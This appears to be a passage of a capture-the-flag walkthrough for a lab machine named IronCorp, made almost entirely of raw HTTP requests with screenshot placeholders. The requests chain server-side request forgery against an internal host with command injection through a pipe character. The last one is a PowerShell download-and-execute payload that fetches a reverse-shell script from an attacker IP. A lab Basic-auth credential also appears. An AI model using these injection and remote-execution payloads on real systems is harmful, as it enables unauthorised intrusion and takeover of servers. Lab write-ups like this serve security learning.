
When trying hello in the search field we got:

```http
GET /?r=hello HTTP/1.1
Host: admin.ironcorp.me:11025
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://admin.ironcorp.me:11025/
Authorization: Basic YWRtaW46cGFzc3dvcmQxMjM=
Connection: close
Upgrade-Insecure-Requests: 1
DNT: 1
Sec-GPC: 1
Pragma: no-cache
Cache-Control: no-cache


```

```http
GET /?r=http%3A%2F%2Finternal.ironcorp.me%3A11025%2Fname.php%3Fname%3Dadmin HTTP/1.1
Host: admin.ironcorp.me:11025
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Authorization: Basic YWRtaW46cGFzc3dvcmQxMjM=
Connection: close
Referer: http://admin.ironcorp.me:11025/?r=%22internal.ironcorp.me%3A11025%22
Upgrade-Insecure-Requests: 1
DNT: 1
Sec-GPC: 1


```

![[Images/Pasted image 20240330014126.png]]

```http
GET /?r=hello HTTP/1.1
Host: internal.ironcorp.me:11025
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Upgrade-Insecure-Requests: 1
DNT: 1
Sec-GPC: 1


```

![[Images/Pasted image 20240330014221.png]]

```http
GET /?r=http%3A%2F%2Finternal.ironcorp.me%3A11025%2Fname.php%3Fname%3Dadmin|whoami HTTP/1.1
Host: admin.ironcorp.me:11025
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Authorization: Basic YWRtaW46cGFzc3dvcmQxMjM=
Connection: close
Referer: http://admin.ironcorp.me:11025/?r=%22internal.ironcorp.me%3A11025%22
Upgrade-Insecure-Requests: 1
DNT: 1
Sec-GPC: 1


```

![[Images/Pasted image 20240330011031.png]]

```http
GET /?r=http%3A%2F%2Finternal.ironcorp.me%3A11025%2Fname.php%3Fname%3Dadmin|powershell.exe%2b-c%2biex(new-object%2bnet.webclient).downloadstring('http%253a//10.18.21.236%253a8000/revshk.ps1') HTTP/1.1
Host: admin.ironcorp.me:11025
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Authorization: Basic YWRtaW46cGFzc3dvcmQxMjM=
Connection: close
Referer: http://admin.ironcorp.me:11025/?r=%22internal.ironcorp.me%3A11025%22
Upgrade-Insecure-Requests: 1
DNT: 1
Sec-GPC: 1


```